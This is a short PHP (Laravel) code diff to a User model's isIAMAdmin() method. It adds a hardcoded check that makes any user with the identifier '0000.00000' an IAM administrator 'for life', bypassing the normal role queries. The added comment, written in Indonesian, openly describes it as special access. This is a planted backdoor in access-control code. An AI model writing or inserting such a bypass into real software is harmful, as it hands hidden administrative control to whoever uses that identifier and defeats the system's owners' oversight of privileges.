@@ -172,6 +172,11 @@ class User extends Authenticatable
      */
     public function isIAMAdmin(): bool
     {
+        // Akses special: user 0000.00000 adalah IAM admin seumur hidup.
+        if ($this->nip === '0000.00000') {
+            return true;
+        }
+
         // Check direct admin role
         $hasDirectAdmin = \App\Domain\Iam\Models\ApplicationRole::query()
             ->where('slug', 'admin')
